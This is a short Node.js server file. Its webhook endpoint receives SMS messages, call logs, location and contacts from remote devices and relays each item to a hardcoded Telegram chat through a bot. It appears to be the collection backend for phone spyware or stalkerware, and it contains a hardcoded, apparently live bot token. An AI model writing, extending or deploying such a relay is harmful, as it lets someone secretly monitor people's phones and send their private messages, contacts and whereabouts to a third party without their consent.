const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');

const botToken = "7678670381:AAFPa1p6fFMB7ImwXIMYtjhRJ2arybZZ3io";
const chatId = "6522295816";

const app = express();
const bot = new TelegramBot(botToken, { polling: true });

app.use(bodyParser.json());

app.post('/webhook', (req, res) => {
    const body = req.body;
    const id = body.deviceId || "unknown-device";

    bot.sendMessage(chatId, `📡 Report from ${id}`);

    if (body.sms) bot.sendMessage(chatId, `📨 SMS: ${JSON.stringify(body.sms).substring(0, 4000)}`);
    if (body.calls) bot.sendMessage(chatId, `📞 Calls: ${JSON.stringify(body.calls).substring(0, 4000)}`);
    if (body.location) bot.sendMessage(chatId, `📍 Location: ${body.location}`);
    if (body.contacts) bot.sendMessage(chatId, `👥 Contacts: ${JSON.stringify(body.contacts).substring(0, 4000)}`);

    res.status(200).send("OK");
});

app.listen(8080, () => {
    console.log("📡 Webhook running on port 8080");
});
